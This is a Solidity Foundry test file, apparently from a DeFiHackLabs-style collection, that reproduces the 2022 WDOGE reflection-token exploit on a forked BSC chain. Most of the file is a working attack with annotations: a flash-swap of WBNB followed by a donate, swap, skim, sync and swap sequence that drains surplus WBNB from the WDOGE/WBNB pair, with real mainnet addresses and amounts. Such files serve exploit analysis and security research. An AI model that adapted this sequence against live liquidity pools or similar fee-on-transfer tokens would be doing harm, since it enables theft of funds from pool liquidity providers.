// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// 2022-04-Wdoge exploit PoC (DeFiHackLabs style).
// Deep manual analysis annotations added:
//
// VULNERABILITY is in the WDOGE token itself (copied at sources/WDOGE_46bA8a/WDOGE.sol):
//   - Reflection (redistribute) + fees on every post-window transfer.
//   - Reflections and fee remnants accrue inside the pair contract address.
//   - No pair exclusion + double accounting in _transfer/burn -> balanceOf(pair) diverges from reserves.
//
// EXPLOIT STEPS are marked with "EXPLOIT STEP N" comments in pancakeCall().
// The attack uses a flash-swap of WBNB as seed capital, manipulates the WDOGE/WBNB pair
// via donate + swap + push + skim + sync + push + swap to extract surplus WBNB, then repays.
//
// Only .sol files were edited (per task). See Wdoge_exp.md for high-level overview and
// the PancakePair source for the skim/sync surface.

contract ContractTest is Test {
    IWBNB wbnb = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IERC20 busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 wdoge = IERC20(0x46bA8a59f4863Bd20a066Fd985B163235425B5F9);
    address public wdoge_wbnb = 0xB3e708a6d1221ed7C58B88622FDBeE2c03e4DB4d;
    address public BUSDT_WBNB_Pair = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("http://127.0.0.1:8546", 17_248_705); //fork bsc at block 17248705
    }

    function testExploit() public {
        // Entry point: obtain a flash-swap of 2900 WBNB from the BUSD/WBNB pair (the callback performs the entire drain).
        // The flash pair acts purely as a WBNB source; the profit is extracted from the WDOGE/WBNB pair via the desync.
        IPancakePair(BUSDT_WBNB_Pair).swap(0, 2900 ether, address(this), "0x");
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        emit log_named_uint("After flashswap: WBNB balance of attacker", wbnb.balanceOf(address(this)) / 1e18);

        // EXPLOIT STEP 1: Flash-donated WBNB is pushed into the WDOGE/WBNB pair (full amount arrives; WBNB has no fees).
        // This temporarily increases pair's WBNB balance.
        wbnb.transfer(wdoge_wbnb, 2900 ether);

        // EXPLOIT STEP 2: Swap the donated WBNB for a massive WDOGE amountOut.
        // Because of prior state + fee math on the *outgoing* WDOGE transfer (pair is sender -> attacker receives net after 10% fees),
        // attacker obtains a huge pile of WDOGE. Pair's WDOGE reserve drops; WBNB reserve updates to include the 2900.
        IPancakePair(wdoge_wbnb).swap(6_638_066_501_837_822_413_045_167_240_755, 0, address(this), "");

        // EXPLOIT STEP 3: Push some WDOGE back into the pair.
        // WDOGE _transfer applies fees+redistribute: pair receives ~90% + possible redistribute share (because pair is now a tracked holder).
        // This creates balance_WDOGE > stored reserve_WDOGE (the desync root).
        wdoge.transfer(wdoge_wbnb, 5_532_718_068_557_297_916_520_398_869_451);

        // EXPLOIT STEP 4: skim() drains the *excess* balance (post-fee + reflections) directly to attacker.
        // At this point excess is almost exactly the net WDOGE just pushed (minus any math weirdness).
        IPancakePair(wdoge_wbnb).skim(address(this));

        // EXPLOIT STEP 5: sync() forces *both* reserves to the *current* balances.
        // After skim, WDOGE balance is back to pre-push reserve value.
        // WBNB balance still contains the full donated 2900 -> this permanently bakes the donated WBNB into `reserve1` (WBNB side)
        // without a matching WDOGE liability on the books. The pair is now "over-reserved" on WBNB.
        IPancakePair(wdoge_wbnb).sync();

        // EXPLOIT STEP 6: Push a second tranche of WDOGE. Again triggers fees/reflections into pair.
        wdoge.transfer(wdoge_wbnb, 4_466_647_961_091_568_568_393_910_837_883);

        // EXPLOIT STEP 7: Swap the new WDOGE for a huge WBNB payout.
        // Pricing is now based on the freshly-synced high WBNB reserve (from donated amount).
        // The K check passes (with fee adjustment) because of the manipulated reserves vs actual.
        // Attacker receives ~2.97e21 wei WBNB (far more than "should" be possible from the input).
        IPancakePair(wdoge_wbnb).swap(0, 2_978_658_352_619_485_704_640, address(this), "");

        // EXPLOIT STEP 8: Repay the flash (2908 WBNB covers 2900 + premium). Surplus WBNB remains in attacker.
        wbnb.transfer(BUSDT_WBNB_Pair, 2908 ether);
        emit log_named_uint(
            "After repaying flashswap, Profit: WBNB balance of attacker", wbnb.balanceOf(address(this)) / 1e18
        );
    }
}
